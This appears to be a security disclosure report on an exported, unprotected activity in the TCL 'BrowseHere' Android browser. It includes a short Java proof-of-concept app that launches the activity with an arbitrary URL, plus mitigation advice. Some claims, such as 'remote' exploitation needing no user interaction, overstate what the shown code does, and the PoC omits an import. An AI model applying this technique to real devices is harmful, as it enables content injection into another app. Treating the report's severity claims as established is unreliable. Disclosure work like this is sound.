## Vulnerability Report

### Overview:
A Remote Code Execution (RCE) vulnerability has been discovered in the `com.tcl.browser` application on the Android platform. The vulnerability allows an attacker to execute arbitrary code on the victim's device without requiring any permissions.

### Application Details:
- **Application Name:** 'Browser TV Web - BrowseHere' com.tcl.browser
- **Version:** 6.49.059_a62ef28f_230730_gp
- **Component:** com.tcl.browser.portal.browse.activity.BrowsePageActivity

### Vulnerability Details:

- **Vulnerability Type:** Remote Code Execution (RCE)
- **Attack Vector:** Via an exported activity component
- **Permissions Required:** None
- **Severity:** High

### Description:

The `com.tcl.browser.portal.browse.activity.BrowsePageActivity` activity in the `com.tcl.browser` app is exported and can be invoked by any third-party application without requiring any permissions. A malicious app can exploit this to execute arbitrary JavaScript code within the context of the `com.tcl.browser` application.

This vulnerability is particularly concerning because:
- The victim does not need to grant any special permissions to any installed applications.
- The attack can be initiated remotely without user interaction.

### Proof of Concept (PoC):

To demonstrate the vulnerability, one can create a simple Android app that invokes the exported `BrowsePageActivity` activity.

package com.example.d3m0;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Create the intent to start the BrowsePageActivity of com.tcl.browser app
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setComponent(new ComponentName("com.tcl.browser", "com.tcl.browser.portal.browse.activity.BrowsePageActivity"));

        // Set the URL data you want to pass (for example "http://www.example.com")
        intent.setData(Uri.parse("http://www.example.com"));

        // Start the activity
        startActivity(intent);
        finish();
    }
}


### Impact:

Successful exploitation allows an attacker to:
- Execute arbitrary JavaScript code within the context of the `com.tcl.browser` app.
- Perform any action that the `com.tcl.browser` app can do, potentially leading to further device exploitation or data theft.

### Mitigation and Recommendations:

1. **Restrict Activity Export:** Do not export activities unless necessary. If required, implement proper authorization checks to ensure that only legitimate entities can invoke it.


**Note:**

### The programmatic removal of JavaScript Tnterfaces post setting the user agent in the WebView limits leveraging certain methods.

````
webView.removeJavascriptInterface("searchBoxJavaBridge_");
webView.removeJavascriptInterface("accessibility");
webView.removeJavascriptInterface("accessibilityTraversal");

````


